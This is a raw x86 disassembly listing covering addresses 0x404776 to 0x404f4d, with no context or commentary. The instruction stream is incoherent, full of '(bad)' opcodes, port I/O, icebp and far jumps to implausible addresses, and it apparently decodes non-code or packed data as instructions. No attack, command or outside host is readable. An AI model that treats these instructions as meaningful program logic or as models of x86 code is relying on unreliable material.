  404776:	sbb    dl,BYTE PTR [ebp-0x191e2cc6]
  40477c:	in     al,0xdd
  40477e:	loop   0x40473c
  404780:	sub    esp,ebp
  404782:	test   bh,dl
  404784:	in     al,dx
  404785:	adc    esp,esp
  404787:	inc    edi
  404788:	inc    ecx
  404789:	xor    ah,BYTE PTR [edi-0x60]
  40478c:	sti    
  40478d:	jecxz  0x404731
  40478f:	ret    
  404790:	fs stos BYTE PTR es:[edi],al
  404792:	ja     0x4047d2
  404794:	or     al,0x67
  404796:	stos   DWORD PTR es:[edi],eax
  404797:	jecxz  0x404736
  404799:	xor    eax,0x8376ecf1
  40479e:	dec    ebx
  40479f:	and    bl,BYTE PTR ds:0xe7944e45
  4047a5:	sub    al,0x9b
  4047a7:	sub    al,0xcc
  4047a9:	pop    edx
  4047aa:	fiadd  WORD PTR cs:[ecx]
  4047ad:	stos   DWORD PTR es:[edi],eax
  4047ae:	fistp  WORD PTR [ebx+ebx*1]
  4047b1:	xchg   DWORD PTR [edi-0x75],esp
  4047b4:	push   ebp
  4047b5:	fimul  DWORD PTR [ecx]
  4047b7:	(bad)  
  4047b8:	rcl    dh,1
  4047ba:	mov    bh,0x9e
  4047bc:	clc    
  4047bd:	out    dx,al
  4047be:	inc    ecx
  4047bf:	dec    edx
  4047c0:	out    dx,al
  4047c1:	sub    ebp,DWORD PTR [ebx]
  4047c3:	mov    ah,0x4a
  4047c5:	cmp    eax,0xafd91f2
  4047ca:	icebp  
  4047cb:	(bad)  
  4047cc:	(bad)  
  4047cd:	popa   
  4047ce:	aas    
  4047cf:	out    dx,al
  4047d0:	mov    WORD PTR [edi-0x6b4bcb2f],gs
  4047d6:	pop    esp
  4047d7:	xor    ebx,DWORD PTR [eax]
  4047d9:	std    
  4047da:	jb     0x404847
  4047dc:	sahf   
  4047dd:	fnsave [ebp-0x2b046881]
  4047e3:	out    dx,eax
  4047e4:	dec    ebx
  4047e5:	cmp    eax,0x79f3d88f
  4047ea:	icebp  
  4047eb:	je     0x404783
  4047ed:	in     al,0x56
  4047ef:	lods   eax,DWORD PTR ds:[esi]
  4047f0:	hlt    
  4047f1:	add    BYTE PTR [ecx-0x5],0xf4
  4047f5:	aad    0xdc
  4047f7:	lock jmp FWORD PTR ds:0x9f6f412
  4047fe:	clc    
  4047ff:	pop    es
  404800:	aam    0x2b
  404802:	or     DWORD PTR [ebx+0x25],edx
  404805:	dec    ebp
  404806:	fwait
  404807:	xchg   edi,eax
  404808:	mov    edx,DWORD PTR [edi]
  40480a:	mov    cl,0x7f
  40480c:	fs cwde 
  40480e:	fcomp  QWORD PTR [ebx]
  404810:	ret    0xf20d
  404813:	pop    ebx
  404814:	(bad)  [edi*2+0x2d4d4bfb]
  40481b:	mov    bh,0x39
  40481d:	iret   
  40481e:	push   0x60376c96
  404823:	cmp    BYTE PTR [ecx+0x3f139f3b],cl
  404829:	rcl    DWORD PTR [edi],1
  40482b:	je     0x40482c
  40482d:	push   edx
  40482e:	add    al,0x1d
  404830:	dec    edx
  404831:	jmp    0x4047d7
  404833:	mov    db6,edi
  404836:	jg     0x404871
  404838:	outs   dx,DWORD PTR ds:[esi]
  404839:	(bad)  
  40483a:	sub    DWORD PTR [eax-0x5d5c5db9],edi
  404840:	cmp    al,0x6c
  404842:	(bad)
  404848:	mov    ebx,0xefde1e3a
  40484d:	mov    edi,0xf2ed9952
  404852:	jb     0x4047f0
  404854:	mov    ebp,0xcfce5a05
  404859:	frstor [edx+edi*1+0x7b]
  40485d:	in     eax,0x1b
  40485f:	mov    edi,0xc8639737
  404864:	sub    al,BYTE PTR [ebp-0x43]
  404867:	sbb    edi,eax
  404869:	and    edi,edi
  40486b:	in     al,dx
  40486c:	dec    ebx
  40486d:	push   eax
  40486e:	(bad)  
  40486f:	jecxz  0x4047f6
  404871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404872:	xchg   ecx,eax
  404873:	and    eax,0x3de549f1
  404878:	aad    0x16
  40487a:	jb     0x4048e4
  40487c:	psrld  mm3,mm2
  40487f:	out    dx,eax
  404880:	jbe    0x404831
  404882:	es inc ebx
  404884:	xchg   ecx,eax
  404885:	inc    esi
  404886:	test   edi,ebx
  404888:	and    edx,DWORD PTR ds:0x8330f84f
  40488e:	mov    eax,0xe392044b
  404893:	add    ebx,edx
  404895:	aam    0xd9
  404897:	mov    edx,DWORD PTR [edx]
  404899:	or     BYTE PTR [edi+ebp*2+0x6b],0x7
  40489e:	jnp    0x4048f0
  4048a0:	(bad)  
  4048a1:	jae    0x4048c1
  4048a3:	cld    
  4048a4:	sti    
  4048a5:	and    BYTE PTR [edx-0x4c993a7a],dh
  4048ab:	jbe    0x4048b5
  4048ad:	std    
  4048ae:	push   0x690c0d77
  4048b3:	sub    ecx,DWORD PTR [ebx-0x449c15d5]
  4048b9:	sbb    al,0x6b
  4048bb:	ja     0x404879
  4048bd:	and    BYTE PTR [esi+0x1a23e3e0],ah
  4048c3:	jg     0x404898
  4048c5:	std    
  4048c6:	in     eax,0x5f
  4048c8:	jge    0x4048b8
  4048ca:	(bad)  
  4048cb:	sbb    al,0x4b
  4048cd:	outs   dx,BYTE PTR ds:[esi]
  4048ce:	sti    
  4048cf:	cmp    bl,ah
  4048d1:	fcomi  st,st(5)
  4048d3:	mul    DWORD PTR [eax]
  4048d5:	mov    WORD PTR [eax-0x45],es
  4048d8:	imul   ebx,DWORD PTR [ecx+0x1e],0x4f
  4048dc:	outs   dx,DWORD PTR ds:[esi]
  4048dd:	jae    0x4048ed
  4048df:	xor    BYTE PTR [eax],cl
  4048e1:	ja     0x4048f5
  4048e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e4:	sub    eax,0x666fee8f
  4048e9:	es jmp 0x404899
  4048ec:	lock jl 0x40488d
  4048ef:	dec    edx
  4048f0:	xchg   di,ax
  4048f2:	cwde   
  4048f3:	xchg   esi,eax
  4048f4:	scas   al,BYTE PTR es:[edi]
  4048f5:	inc    esp
  4048f6:	inc    esi
  4048f7:	call   0x86fe:0x51b5f6cf
  4048fe:	sahf   
  4048ff:	pandn  mm2,QWORD PTR [ebx+ebp*4]
  404903:	aas    
  404904:	adc    ah,BYTE PTR [ebp+0x6]
  404907:	sahf   
  404908:	loopne 0x4048b8
  40490a:	inc    DWORD PTR [esi+0x7b31508]
  404910:	mov    bl,0x42
  404912:	push   edx
  404913:	mov    ebp,0xda4d006c
  404918:	aas    
  404919:	jle    0x4048cf
  40491b:	mov    al,ds:0xc20c61b9
  404920:	xlat   BYTE PTR ds:[ebx]
  404921:	adc    al,0xa
  404923:	xor    BYTE PTR [edi+ebp*1],ah
  404926:	jg     0x404937
  404928:	inc    edi
  404929:	sbb    al,0x84
  40492b:	dec    ebx
  40492c:	mov    esp,0x2fadf9e3
  404931:	or     DWORD PTR [esi-0x33],esi
  404934:	loopne 0x4048da
  404936:	retf   
  404937:	or     DWORD PTR [edi-0x1c],0x98d03168
  40493e:	out    0xd8,al
  404940:	xchg   edi,eax
  404941:	imul   edx,DWORD PTR [ecx],0x57
  404944:	and    eax,0x64325a02
  404949:	mov    eax,DWORD PTR [eax+0x3e]
  40494c:	test   cl,al
  40494e:	ja     0x404960
  404950:	sar    DWORD PTR [ebx+0x28],cl
  404953:	push   edi
  404954:	in     al,dx
  404955:	xor    eax,0xf988506a
  40495a:	or     BYTE PTR es:[ebx-0x1a257ddd],dh
  404961:	cld    
  404962:	cmp    al,BYTE PTR [esi+0x3a966352]
  404968:	push   edi
  404969:	rcr    DWORD PTR [edx+0x79ab5680],cl
  40496f:	sub    DWORD PTR [eax-0x5c],esp
  404972:	ds sbb al,0x9f
  404975:	lock cmp eax,0xf1ed77ff
  40497b:	push   esp
  40497c:	push   eax
  40497d:	cdq    
  40497e:	and    al,0x22
  404980:	mov    al,0x9f
  404982:	(bad)
  404986:	dec    ebp
  404987:	push   esi
  404988:	pop    esi
  404989:	fsubrp st(1),st
  40498b:	inc    ebx
  40498c:	iret   
  40498d:	push   ebx
  40498e:	sub    ebp,0x1d1f1bcf
  404994:	aad    0x17
  404996:	mov    edi,0xe1cef884
  40499b:	pusha  
  40499c:	outs   dx,DWORD PTR ds:[esi]
  40499d:	ret    0x3dbd
  4049a0:	in     al,dx
  4049a1:	sbb    ebp,esi
  4049a3:	icebp  
  4049a4:	out    0xae,al
  4049a6:	mov    edi,0x77bcb430
  4049ab:	push   eax
  4049ac:	iret   
  4049ad:	test   BYTE PTR [esi-0x7ae27718],bh
  4049b3:	fldln2 
  4049b5:	mov    al,0x85
  4049b7:	fcom   DWORD PTR [ecx-0x74ffe559]
  4049bd:	imul   ebx,DWORD PTR [esi+0x73],0xd4c6c942
  4049c4:	fs pusha 
  4049c6:	test   cl,bh
  4049c8:	scas   al,BYTE PTR es:[edi]
  4049c9:	fld    DWORD PTR [ebp+0x70]
  4049cc:	ss fidiv WORD PTR cs:[eax+0x5b]
  4049d1:	xchg   DWORD PTR [ebp+edi*4+0x0],ecx
  4049d5:	les    eax,FWORD PTR [ecx+0x6f602999]
  4049db:	popf   
  4049dc:	mov    cs,WORD PTR [edx+0xb3927c]
  4049e2:	psllw  mm0,mm3
  4049e5:	mov    ah,0x29
  4049e7:	out    0x3d,eax
  4049e9:	sbb    edx,esi
  4049eb:	inc    edx
  4049ec:	in     eax,0x4e
  4049ee:	inc    ecx
  4049ef:	add    edx,DWORD PTR [edx-0x54]
  4049f2:	xlat   BYTE PTR ds:[ebx]
  4049f3:	outs   dx,BYTE PTR ds:[esi]
  4049f4:	mov    bh,0xaf
  4049f6:	add    al,BYTE PTR [edi-0x36]
  4049f9:	(bad)  [eax-0x43]
  4049fc:	xor    BYTE PTR [ebx+esi*2-0x67],0x33
  404a01:	xor    DWORD PTR [ecx+0x5],0xfe4802a4
  404a08:	adc    eax,0xfbdc7d02
  404a0d:	pop    ebp
  404a0e:	ja     0x404a4b
  404a10:	outs   dx,DWORD PTR ds:[esi]
  404a11:	rcr    ecx,cl
  404a13:	jae    0x404a86
  404a15:	shr    DWORD PTR [edi],cl
  404a17:	loop   0x4049fc
  404a19:	push   ebx
  404a1a:	shl    BYTE PTR [ebx-0x276b9184],1
  404a20:	test   eax,0x4b5fbc02
  404a25:	sub    eax,0x30cf13f
  404a2a:	and    eax,0x6d7f9643
  404a2f:	adc    bl,ah
  404a31:	xor    dh,al
  404a33:	lods   al,BYTE PTR ds:[esi]
  404a34:	push   edx
  404a35:	mov    esi,fs
  404a37:	sub    edi,DWORD PTR [edi+0x54a3e92d]
  404a3d:	stc    
  404a3e:	popf   
  404a3f:	dec    BYTE PTR [esi]
  404a41:	mov    esp,DWORD PTR [edi+ebp*8+0x102362b0]
  404a48:	lock cwde 
  404a4a:	add    eax,0xf35b8d6e
  404a4f:	add    dh,BYTE PTR [eax+edx*4+0x61c9036f]
  404a56:	mov    eax,ds:0x783d960d
  404a5b:	push   ecx
  404a5c:	dec    edi
  404a5d:	and    ebp,DWORD PTR [edi-0x78]
  404a60:	xchg   esp,eax
  404a61:	and    DWORD PTR [ebp+0x1b],eax
  404a64:	jns    0x404a25
  404a66:	xor    esi,DWORD PTR [edx]
  404a68:	jmp    0x404a35
  404a6a:	lods   al,BYTE PTR ds:[esi]
  404a6b:	jg     0x404a2e
  404a6d:	mov    dh,0x88
  404a6f:	aaa    
  404a70:	xor    BYTE PTR [edx+ebp*1-0x39],bh
  404a74:	mov    ds:0xf26a2503,al
  404a79:	sbb    al,0x5b
  404a7b:	stc    
  404a7c:	mov    DWORD PTR [eax+ecx*1-0x19fda955],esp
  404a83:	cmp    DWORD PTR [esi-0x24b3f716],ecx
  404a89:	mov    edx,0xde53ceb9
  404a8e:	inc    ecx
  404a8f:	data16 xor al,0xd8
  404a92:	shl    DWORD PTR [ebp+0xeee097d],0xf9
  404a99:	in     al,0x28
  404a9b:	xchg   ecx,eax
  404a9c:	sub    bh,0x1d
  404a9f:	stos   BYTE PTR es:[edi],al
  404aa0:	ins    DWORD PTR es:[edi],dx
  404aa1:	mul    BYTE PTR ds:0xf46a9fa6
  404aa7:	test   eax,0xb505ad85
  404aac:	aaa    
  404aad:	or     DWORD PTR [eax-0x3c],0xc7a83d21
  404ab4:	jp     0x404a59
  404ab6:	retf   0x9169
  404ab9:	or     BYTE PTR [edx+0x1494f155],bl
  404abf:	ja     0x404a52
  404ac1:	nop
  404ac2:	inc    edx
  404ac3:	clc    
  404ac4:	or     cl,BYTE PTR [edx+0x3de85c6e]
  404aca:	adc    eax,0xf11e8915
  404acf:	cld    
  404ad0:	sti    
  404ad1:	rol    esp,1
  404ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad4:	mov    al,ds:0x6637f80f
  404ad9:	aas    
  404ada:	pop    es
  404adb:	mov    edx,0x2bf4c9a6
  404ae0:	in     eax,dx
  404ae1:	mov    ecx,0x4eaa7a46
  404ae6:	inc    edx
  404ae7:	das    
  404ae8:	cmp    edx,edi
  404aea:	inc    edi
  404aeb:	sbb    esp,ebx
  404aed:	imul   DWORD PTR [esi-0x3b]
  404af0:	inc    ebp
  404af1:	mov    fs,esi
  404af3:	retf   
  404af4:	push   ecx
  404af5:	jno    0x404b41
  404af7:	jg     0x404ade
  404af9:	(bad)
  404afc:	scas   eax,DWORD PTR es:[edi]
  404afd:	cmp    eax,0x1c07ed0b
  404b02:	jecxz  0x404b7d
  404b04:	inc    esi
  404b05:	mov    edx,0x4ed75657
  404b0a:	loopne 0x404b37
  404b0c:	and    eax,DWORD PTR [ebp-0x11fe10e]
  404b12:	test   al,0x50
  404b14:	mov    ecx,0x74c1e6fc
  404b19:	add    BYTE PTR [ebp+0x17abe905],dl
  404b1f:	je     0x404b9d
  404b21:	imul   BYTE PTR [bx-0x29]
  404b25:	cmp    bl,bh
  404b27:	pop    es
  404b28:	jge    0x404b9c
  404b2a:	jg     0x404b73
  404b2c:	xchg   ebp,eax
  404b2d:	retf   0x555d
  404b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b31:	push   esi
  404b32:	imul   esp,DWORD PTR [ecx+0x14889d4],0x3cd62726
  404b3c:	xor    al,0xd3
  404b3e:	pop    ecx
  404b3f:	sahf   
  404b40:	adc    ah,BYTE PTR [ebx-0x1f]
  404b43:	xor    ah,ah
  404b45:	out    0x34,eax
  404b47:	int    0x4
  404b49:	adc    al,0xf4
  404b4b:	inc    ebp
  404b4c:	cmp    dh,BYTE PTR [eax]
  404b4e:	in     eax,0x8c
  404b50:	add    BYTE PTR [edi-0x11],bl
  404b53:	pop    DWORD PTR [edi-0x5c]
  404b56:	or     BYTE PTR [ecx],bh
  404b58:	hlt    
  404b59:	mov    al,ds:0x5269ee5d
  404b5e:	in     eax,0x1c
  404b60:	cdq    
  404b61:	add    bh,BYTE PTR [esi+0x6a]
  404b64:	ss (bad) 
  404b66:	lods   al,BYTE PTR ds:[esi]
  404b67:	sbb    eax,0x2647fee9
  404b6c:	das    
  404b6d:	jmp    FWORD PTR [edi]
  404b6f:	mov    edi,0xe7e247f5
  404b74:	mov    ch,0xea
  404b76:	pop    es
  404b77:	inc    esi
  404b78:	in     eax,dx
  404b79:	out    0xc3,eax
  404b7b:	pop    eax
  404b7c:	(bad)  
  404b7d:	loop   0x404ba9
  404b7f:	cmp    cl,ah
  404b81:	pop    ebx
  404b82:	leave  
  404b83:	push   cs
  404b84:	cmp    DWORD PTR [ebp-0x241c894e],edx
  404b8a:	je     0x404b9e
  404b8c:	sti    
  404b8d:	scas   eax,DWORD PTR es:[edi]
  404b8e:	test   BYTE PTR [edx+0x77a6946d],bh
  404b94:	in     al,0xf3
  404b96:	push   ss
  404b97:	sahf   
  404b98:	dec    eax
  404b99:	push   edx
  404b9a:	mov    al,0x61
  404b9c:	xchg   esi,eax
  404b9d:	mov    bh,0xcf
  404b9f:	ret    
  404ba0:	rcr    DWORD PTR [eax-0x14],cl
  404ba3:	jp     0x404bea
  404ba5:	and    bl,cl
  404ba7:	shr    BYTE PTR [ebx-0x71],0x5e
  404bab:	pop    edi
  404bac:	ret    0xcbfd
  404baf:	out    dx,al
  404bb0:	xchg   DWORD PTR [edx],eax
  404bb2:	fstp   DWORD PTR [ebx]
  404bb4:	mov    ax,cx
  404bb7:	adc    DWORD PTR [esi+0x17f13ad4],ecx
  404bbd:	jmp    0x1cc159f9
  404bc2:	mov    ebp,DWORD PTR [edi]
  404bc4:	push   ebp
  404bc5:	adc    eax,0x2fab5067
  404bca:	rcl    BYTE PTR [edi-0x3eb641f9],cl
  404bd0:	fwait
  404bd1:	js     0x404c25
  404bd3:	pop    edi
  404bd4:	mov    dl,0xc9
  404bd6:	push   0xe0db171c
  404bdb:	jmp    ebx
  404bdd:	ins    DWORD PTR es:[edi],dx
  404bde:	push   ds
  404bdf:	or     al,0x7a
  404be1:	hlt    
  404be2:	les    esp,FWORD PTR [eax+0x3b]
  404be5:	das    
  404be6:	enter  0xcfd5,0xc8
  404bea:	sub    al,0xdd
  404bec:	push   edx
  404bed:	jno    0x404c16
  404bef:	push   edi
  404bf0:	xor    ah,dh
  404bf2:	scas   al,BYTE PTR es:[edi]
  404bf3:	mov    eax,0x7cb4ea12
  404bf8:	push   ss
  404bf9:	sbb    DWORD PTR [esi+ebp*1-0x23],eax
  404bfd:	retf   0xd9c0
  404c00:	cmp    DWORD PTR [ecx+0x55],edi
  404c03:	mov    eax,ds:0xc16f9693
  404c08:	jbe    0x404c13
  404c0a:	push   esi
  404c0b:	cli    
  404c0c:	xchg   ebp,eax
  404c0d:	sub    al,0xbf
  404c0f:	ficom  WORD PTR [esi+0x3ebafd1d]
  404c15:	push   0x9b7cb3e9
  404c1a:	cs pop ebx
  404c1c:	push   0xffffffcb
  404c1e:	dec    edx
  404c1f:	icebp  
  404c20:	(bad)  
  404c21:	loopne 0x404bac
  404c23:	dec    esp
  404c24:	fs stos DWORD PTR es:[edi],eax
  404c26:	mov    bl,0x8b
  404c28:	pop    ebp
  404c29:	jns    0x404bc5
  404c2b:	dec    eax
  404c2c:	jo     0x404c08
  404c2e:	cmp    eax,0x4436704b
  404c33:	sub    ebx,ecx
  404c35:	dec    eax
  404c36:	out    dx,al
  404c37:	imul   ebp
  404c39:	shl    BYTE PTR [esp+eiz*8-0x63afb1fd],1
  404c40:	mov    bh,0x6a
  404c42:	enter  0x83a,0xd1
  404c46:	imul   edx,DWORD PTR [ebx],0xffffff99
  404c49:	repnz mov dh,0xc3
  404c4c:	imul   edi,DWORD PTR [eax+ecx*4],0x9d669c23
  404c53:	(bad)
  404c56:	inc    ebx
  404c57:	inc    ecx
  404c58:	(bad)
  404c5c:	(bad)  
  404c5d:	jle    0x404c2c
  404c5f:	lds    ebx,FWORD PTR [edi-0x1a]
  404c62:	popf   
  404c63:	or     DWORD PTR [edx+0x4ead4612],eax
  404c69:	fstp   TBYTE PTR [esi+0x37ad74ba]
  404c6f:	cmp    DWORD PTR [edi],esi
  404c71:	pop    es
  404c72:	(bad)  
  404c73:	daa    
  404c74:	rcr    esi,0x86
  404c77:	adc    al,0x51
  404c79:	dec    esp
  404c7a:	cld    
  404c7b:	pop    edi
  404c7c:	scas   al,BYTE PTR es:[edi]
  404c7d:	or     BYTE PTR [esi-0x23],dh
  404c80:	shl    DWORD PTR [ecx*8-0x371b2792],1
  404c87:	sahf   
  404c88:	push   cs
  404c89:	push   edx
  404c8a:	lds    ebp,FWORD PTR [ebx+0x73a27ee0]
  404c90:	mov    ss:0x54cb7dc3,al
  404c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c97:	(bad)  
  404c98:	out    dx,eax
  404c99:	or     ch,ah
  404c9b:	push   cs
  404c9c:	fst    QWORD PTR [edi]
  404c9e:	adc    BYTE PTR [edi+0x699f5364],bh
  404ca4:	mov    ds:0x660fcbdf,al
  404ca9:	call   0x78e5:0x62c771d9
  404cb0:	lds    ecx,FWORD PTR [ebx]
  404cb2:	adc    dh,ah
  404cb4:	gs cmp eax,esi
  404cb7:	test   eax,0xdffcb5bb
  404cbc:	test   eax,0xdf3f801b
  404cc1:	inc    ebx
  404cc2:	fimul  WORD PTR [ebx+0x6f7bdb5]
  404cc8:	adc    eax,DWORD PTR [ebp-0x20]
  404ccb:	mov    eax,0x948c8725
  404cd0:	xchg   edx,eax
  404cd1:	mov    al,ds:0x81f8ebc3
  404cd6:	and    DWORD PTR [eax],eax
  404cd8:	test   al,0xe4
  404cda:	ja     0x404c7d
  404cdc:	inc    eax
  404cdd:	mov    bh,0xd9
  404cdf:	mov    ebp,0xaf822a5a
  404ce4:	imul   ebp,DWORD PTR ds:0xcf3872ec,0x9a9b338f
  404cee:	mov    eax,DWORD PTR [edx]
  404cf0:	stos   BYTE PTR es:[edi],al
  404cf1:	aad    0x96
  404cf3:	mov    edi,0xcfbfb924
  404cf8:	rcl    cl,cl
  404cfa:	adc    BYTE PTR [ebp-0x23656e0e],0x2b
  404d01:	or     eax,0x94c9db3f
  404d06:	mov    esp,0xaad730ba
  404d0b:	mov    ah,0xed
  404d0d:	cdq    
  404d0e:	fcomi  st,st(2)
  404d10:	in     al,dx
  404d11:	icebp  
  404d12:	aaa    
  404d13:	in     eax,dx
  404d14:	aad    0xf3
  404d16:	or     esp,DWORD PTR [ecx-0x22]
  404d19:	aam    0xb2
  404d1b:	xchg   ah,dl
  404d1d:	ins    DWORD PTR es:[edi],dx
  404d1e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  404d20:	aam    0xed
  404d22:	jbe    0x404cbb
  404d24:	mov    al,0xc3
  404d26:	sub    DWORD PTR [esi+0x3fcb9442],0xffffffb6
  404d2d:	mov    ebx,0xf0db08b3
  404d32:	sti    
  404d33:	inc    edx
  404d34:	rcr    BYTE PTR [esi+edi*8+0x1792e8ab],1
  404d3b:	adc    al,0xb9
  404d3d:	or     ecx,DWORD PTR [ecx+ebp*4]
  404d40:	dec    esi
  404d41:	daa    
  404d42:	adc    DWORD PTR [edi],eax
  404d44:	fisubr WORD PTR [edi+0x2b]
  404d47:	call   0x64dd:0xee8ff23
  404d4e:	xchg   ebx,eax
  404d4f:	push   cs
  404d50:	jecxz  0x404cf0
  404d52:	addr16 pop esi
  404d54:	jmp    0x2f307456
  404d59:	iret   
  404d5a:	and    bh,BYTE PTR [ebx-0x27ff330]
  404d60:	outs   dx,BYTE PTR ds:[esi]
  404d61:	push   eax
  404d62:	mov    DWORD PTR [ecx-0x549d7c0d],eax
  404d68:	fcmovnb st,st(2)
  404d6a:	mov    eax,ds:0xd4870ea9
  404d6f:	data16 lahf 
  404d71:	es jmp 0x1cb3:0x6af55d02
  404d79:	shl    DWORD PTR gs:[ebp-0x43],0xeb
  404d7e:	sub    eax,0xa5c2b4fe
  404d83:	fs sahf 
  404d85:	outs   dx,DWORD PTR ds:[esi]
  404d86:	push   ebx
  404d87:	aaa    
  404d88:	hlt    
  404d89:	sub    BYTE PTR [esi+0x37],dh
  404d8c:	fistp  WORD PTR [ebp+0x7d]
  404d8f:	jmp    DWORD PTR [ecx+ecx*1-0x220cd841]
  404d96:	fwait
  404d97:	and    ecx,DWORD PTR [esi]
  404d99:	js     0x404de6
  404d9b:	jnp    0x404dea
  404d9d:	dec    ebp
  404d9e:	popf   
  404d9f:	fstp   st(1)
  404da1:	jle    0x404db9
  404da3:	(bad)  
  404da5:	addr16 popa 
  404da7:	leave  
  404da8:	rcl    BYTE PTR [ebp-0x11],1
  404dab:	xor    al,0xca
  404dad:	adc    dh,BYTE PTR [eax]
  404daf:	leave  
  404db0:	loope  0x404d52
  404db2:	ret    0x72e0
  404db5:	in     al,dx
  404db6:	add    eax,0xface3678
  404dbb:	xlat   BYTE PTR ds:[ebx]
  404dbc:	xchg   edi,eax
  404dbd:	sub    al,0x45
  404dbf:	mov    bh,0x6a
  404dc1:	stos   BYTE PTR es:[edi],al
  404dc2:	inc    ebx
  404dc3:	mov    cl,0xb8
  404dc5:	xor    BYTE PTR [ecx+edi*1-0x137b40a4],cl
  404dcc:	retf   0x7edf
  404dcf:	fucomip st,st(3)
  404dd1:	jge    0x404de4
  404dd3:	into   
  404dd4:	jno    0x404dd0
  404dd6:	ret    0xfe42
  404dd9:	sbb    DWORD PTR ds:0xbff86d8b,ebp
  404ddf:	fsub   QWORD PTR [edi+0x62]
  404de2:	adc    esp,DWORD PTR [eax-0x173e0800]
  404de8:	jb     0x404db0
  404dea:	fs scas al,BYTE PTR es:[edi]
  404dec:	adc    al,0xae
  404dee:	loope  0x404e6e
  404df0:	xor    DWORD PTR [edi+ebx*1],0xffffff8e
  404df4:	and    eax,DWORD PTR [ecx+0x0]
  404df7:	dec    esi
  404df8:	sbb    eax,0xb200e54c
  404dfd:	mov    DWORD PTR [ebx+0x7b],edi
  404e00:	or     BYTE PTR [esi],0x61
  404e03:	cli    
  404e04:	mov    al,0xbf
  404e06:	push   ebx
  404e07:	add    eax,0xa1aabd56
  404e0c:	int3   
  404e0d:	jmp    0x292d9ff3
  404e12:	daa    
  404e13:	dec    ecx
  404e14:	(bad)  
  404e15:	in     al,dx
  404e16:	rcl    BYTE PTR [eax+ebx*1+0x31fd42a9],1
  404e1d:	jo     0x404e7f
  404e1f:	mov    esp,0x348b3df7
  404e24:	stos   BYTE PTR es:[edi],al
  404e25:	loop   0x404e1e
  404e27:	cmp    bl,BYTE PTR [ecx+0x22]
  404e2a:	mov    al,0x9c
  404e2c:	xor    bl,BYTE PTR [edi-0x4a7bdfb5]
  404e32:	idiv   DWORD PTR [edi]
  404e34:	xchg   ecx,eax
  404e35:	pop    ebp
  404e37:	outs   dx,BYTE PTR ds:[esi]
  404e38:	push   ebx
  404e39:	pop    ecx
  404e3a:	add    al,0xff
  404e3c:	mov    bl,0xc8
  404e3e:	fwait
  404e3f:	jmp    0x404e71
  404e41:	outs   dx,DWORD PTR fs:[esi]
  404e43:	fidivr WORD PTR [ebp-0x35762afc]
  404e49:	icebp  
  404e4a:	out    0xe4,eax
  404e4c:	mov    al,0x93
  404e4e:	shr    BYTE PTR [esi*1+0x1454d334],cl
  404e55:	push   edx
  404e56:	leave  
  404e57:	sub    esp,ecx
  404e59:	jbe    0x404ebf
  404e5b:	int3   
  404e5c:	mov    edi,0x3b36ceb3
  404e61:	inc    ebx
  404e62:	jg     0x404ecd
  404e64:	daa    
  404e65:	in     eax,0xb7
  404e67:	xchg   edx,eax
  404e68:	push   esp
  404e69:	mul    BYTE PTR [ecx-0xd]
  404e6c:	gs cld 
  404e6e:	rcr    DWORD PTR [eax],1
  404e70:	or     BYTE PTR [esi-0x3a263860],cl
  404e76:	push   0xd01232ef
  404e7b:	cwde   
  404e7c:	dec    eax
  404e7d:	add    al,0x32
  404e7f:	sbb    BYTE PTR [ebx-0x34ad505e],ah
  404e85:	shl    BYTE PTR [edi-0x1ea92d5c],0xd2
  404e8c:	adc    ch,BYTE PTR [edx-0x59]
  404e8f:	push   ecx
  404e90:	leave  
  404e91:	jno    0x404e9b
  404e93:	jmp    0xabdbcf15
  404e98:	push   ds
  404e99:	pop    esp
  404e9a:	test   al,0x20
  404e9c:	fimul  DWORD PTR [edi-0x55]
  404e9f:	pop    ecx
  404ea0:	sub    eax,0x86804b94
  404ea5:	lea    esp,[ecx-0x61428df6]
  404eab:	das    
  404eac:	aad    0x10
  404eae:	(bad)  
  404eaf:	cli    
  404eb0:	cdq    
  404eb1:	xchg   ebp,eax
  404eb2:	mov    bl,0x57
  404eb4:	xchg   esi,eax
  404eb5:	jl     0x404e43
  404eb7:	fisttp QWORD PTR [eax+0x72]
  404eba:	mov    al,ds:0x89163b5d
  404ebf:	mov    DWORD PTR [ecx+0xb],ebp
  404ec2:	fdivrp st(1),st
  404ec4:	push   ss
  404ec5:	in     eax,0x1a
  404ec7:	add    cl,BYTE PTR [ebx]
  404ec9:	cmp    BYTE PTR [ecx],dl
  404ecb:	xor    al,0xd8
  404ecd:	xchg   edx,eax
  404ece:	adc    BYTE PTR [eax+ecx*2-0x52beff47],cl
  404ed5:	ins    BYTE PTR es:[edi],dx
  404ed6:	push   0xffffffee
  404ed8:	cld    
  404ed9:	jae    0x404f14
  404edb:	mov    ch,0xc3
  404edd:	test   ebx,ecx
  404edf:	xor    eax,0xa233afd5
  404ee4:	mov    DWORD PTR [edx],0x32cb0c13
  404eea:	test   al,0x2c
  404eec:	push   es
  404eed:	or     eax,0x5ec883dc
  404ef2:	retf   
  404ef3:	xchg   DWORD PTR [edx-0x2d4f06ca],ebp
  404ef9:	ja     0x404ebd
  404efb:	jno    0x404ec2
  404efd:	mov    dh,0xf0
  404eff:	ds jl  0x404ed4
  404f02:	xchg   esi,eax
  404f03:	push   ds
  404f04:	xchg   DWORD PTR [edi-0x5d],esi
  404f07:	jno    0x404e92
  404f09:	iret   
  404f0a:	iret   
  404f0b:	lds    esi,FWORD PTR [eax+0x44]
  404f0e:	and    al,0xfd
  404f10:	pop    ss
  404f11:	fldenv [eax]
  404f13:	mov    esp,0xc5c12da9
  404f18:	jmp    0x404ea0
  404f1a:	push   esi
  404f1b:	mov    al,0x43
  404f1d:	imul   ecx,DWORD PTR [ebx-0x5dc8602d],0xd8d48bbe
  404f27:	add    edi,edi
  404f29:	retf   
  404f2a:	das    
  404f2b:	pop    esp
  404f2c:	and    BYTE PTR [edx-0x7342b7f8],ch
  404f32:	imul   ebp,DWORD PTR [ebx-0x38],0x4c
  404f36:	out    dx,eax
  404f37:	pop    es
  404f38:	jbe    0x404f14
  404f3a:	and    al,0x7f
  404f3c:	sar    DWORD PTR [edx-0x43],0xd2
  404f40:	jmp    0x84fa9d00
  404f45:	or     BYTE PTR [esi],cl
  404f47:	in     eax,0x36
  404f49:	sbb    BYTE PTR [ecx+eiz*2],ah
  404f4c:	pop    edi
  404f4d:	dec    ebx
